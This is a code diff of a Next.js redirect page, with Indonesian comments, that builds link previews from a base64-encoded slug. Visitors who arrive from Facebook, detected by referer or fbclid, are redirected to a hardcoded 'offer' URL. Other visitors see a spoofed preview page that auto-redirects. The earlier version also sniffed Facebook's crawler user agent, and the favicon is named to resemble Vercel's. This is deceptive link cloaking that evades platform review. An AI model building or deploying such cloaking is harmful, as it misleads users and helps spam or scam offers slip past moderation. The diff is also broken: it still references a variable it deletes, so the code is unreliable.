@@ -1,3 +1,4 @@
+// pages/data/[...slug].tsx
 import { GetServerSideProps } from "next";
 import Head from "next/head";
 import { useEffect } from "react";
@@ -8,30 +9,22 @@ interface Props {
   title: string;
 }
 
-const offerUrl = "https://example.com/offer"; // ← ganti ke URL yang kamu mau
-
+const offerUrl = "https://example.com/offer"; // ✅ Ganti dengan offer kamu
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const slugParts = context.params?.slug || [];
-  const encoded = Array.isArray(slugParts) ? slugParts.join("/") : slugParts;
+  const fbclid = context.query.fbclid;
+  const referringURL = context.req.headers.referer || "";
 
   if (!encoded) return { notFound: true };
 
   try {
-    const json = Buffer.from(encoded, "base64").toString("utf-8");
-    const { redirectUrl, imageUrl, title } = JSON.parse(json);
+    const decoded = Buffer.from(encoded, "base64").toString("utf-8");
+    const { redirectUrl, imageUrl, title } = JSON.parse(decoded);
 
-    const fbclid = context.query.fbclid || "";
-    const referer = context.req.headers.referer || "";
-    const ua = context.req.headers["user-agent"] || "";
+    if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
 
-    const isFacebookBot =
-      ua.includes("facebookexternal") ||
-      ua.includes("Facebot") ||
-      fbclid ||
-      referer.includes("facebook.com");
-
-    // 🔁 Redirect langsung ke offer jika dari Facebook
-    if (isFacebookBot) {
+    // 🔁 Redirect langsung jika dari Facebook
+    if (referringURL.includes("facebook.com") || fbclid) {
       return {
         redirect: {
           destination: offerUrl,
@@ -40,7 +33,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
       };
     }
 
-    // ✅ Selain itu, tampilkan halaman dengan preview dan auto-redirect ke link aslinya
+    // ✅ Tampilkan halaman loading
     return {
       props: {
         redirectUrl,
@@ -48,7 +41,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
         title: title || "Redirecting...",
       },
     };
-  } catch (e) {
+  } catch (err) {
     return { notFound: true };
   }
 };
@@ -57,7 +50,7 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
   useEffect(() => {
     const timer = setTimeout(() => {
       window.location.href = redirectUrl;
-    }, 2000);
+    }, 2500);
     return () => clearTimeout(timer);
   }, [redirectUrl]);
 
@@ -67,23 +60,24 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
         <title>{title}</title>
         <meta name="description" content={`Read more at ${redirectUrl}`} />
         <meta property="og:title" content={title} />
-        <meta name="description" content={`Read more at ${redirectUrl}`} />
         <meta property="og:url" content={redirectUrl} />
         <meta property="og:type" content="website" />
         {imageUrl && <meta property="og:image" content={imageUrl} />}
-        <link rel="image_src" href={imageUrl} />
         <link rel="icon" href="/varcel.png" type="image/x-icon" />
-        <style>{`
-          @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-          }
-        `}</style>
+        <style>
+          {`
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+          `}
+        </style>
       </Head>
 
       <main style={styles.container}>
         <div style={styles.loader}></div>
         <div style={styles.loadingText}>Please wait...</div>
+        {/* Gambar tersembunyi untuk preload dan social preview */}
         {imageUrl && (
           <img
             src={imageUrl}
